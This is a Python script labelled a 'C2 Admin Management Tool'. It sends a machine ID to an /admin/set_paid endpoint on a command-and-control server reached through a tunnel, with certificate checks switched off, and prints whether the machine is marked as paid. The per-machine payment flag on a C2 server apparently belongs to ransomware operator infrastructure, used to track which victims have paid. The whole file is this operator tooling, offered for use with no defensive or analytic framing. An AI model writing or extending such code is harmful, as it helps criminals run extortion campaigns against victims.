import requests, argparse, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdminClient:
    def __init__(self, server_url):
        self.server_url = server_url.rstrip('/')
        self.headers = {
            "localtonet-skip-warning": "true",
            "Content-Type": "application/json",
            "User-Agent": "AdminTool/1.0"
        }

    def set_paid(self, machine_id):
        print(f"[*] Target Machine ID: {machine_id}")
        print(f"[*] Connecting to: {self.server_url}/admin/set_paid...")

        payload = {"machine_id": machine_id}

        try:
            response = requests.post(
                f"{self.server_url}/admin/set_paid", 
                json=payload, 
                headers=self.headers,
                verify=False,
                timeout=15
            )

            if response.status_code == 200:
                print("[+] SUCCESS: Machine marked as PAID.")
                print(f"[*] Server Response: {response.json()}")
            elif response.status_code == 404:
                print("[!] ERROR: Machine ID not found on the server.")
            elif response.status_code == 400:
                print("[!] ERROR: Bad Request. Check your Machine ID.")
            else:
                print(f"[!] FAILED: Server returned status {response.status_code}")
                print(f"[*] Response Body: {response.text}")

        except requests.exceptions.ConnectionError:
            print("[!] CONNECTION ERROR: Could not reach the server.")
            print("    Check if your Flask server is running and your tunnel is active.")
        except requests.exceptions.Timeout:
            print("[!] TIMEOUT: The server took too long to respond.")
        except Exception as e:
            print(f"[!] UNEXPECTED ERROR: {type(e).__name__} - {e}")

def main():
    parser = argparse.ArgumentParser(description="C2 Admin Management Tool")
    parser.add_argument("--server", required=True, help="The Public URL of your C2 (e.g., https://your-id.localto.net)")
    parser.add_argument("--id", required=True, help="The Machine ID to set to PAID")

    args = parser.parse_args()

    print("\n")
    admin = AdminClient(args.server)
    admin.set_paid(args.id)
    print("\n")

if __name__ == "__main__":
    main()

